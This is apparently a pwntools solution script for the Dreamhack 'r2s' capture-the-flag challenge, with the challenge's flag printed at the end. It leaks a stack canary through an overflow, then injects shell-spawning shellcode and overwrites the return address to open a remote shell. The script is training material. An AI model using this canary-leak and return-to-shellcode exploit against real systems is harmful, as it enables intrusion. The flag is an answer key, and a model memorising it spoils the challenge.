#!/usr/bin/env python3 

from pwn import *

HOST = "host3.dreamhack.games"
PORT = 17854

context.binary = elf = ELF('./r2s')
# p = process(elf.path)
p = remote(HOST, PORT)

p.recvuntil(b'0x')
buf = int(p.recv(12), 16)
log.info('buf = ' + hex(buf))

payload1 = b'x' * 89
p.sendafter(b'Input: ', payload1)
p.recvuntil(b'x' * 89)
canary = u64(b'\x00' + p.recv(7))

shellcode = asm(shellcraft.sh())
payload2 = shellcode + b'x' * (88 - len(shellcode)) + p64(canary) + b'x' * 8 + p64(buf)
p.sendlineafter(b'Input: ', payload2)

p.interactive()

# DH{333eb89c9d2615dd8942ece08c1d34d5}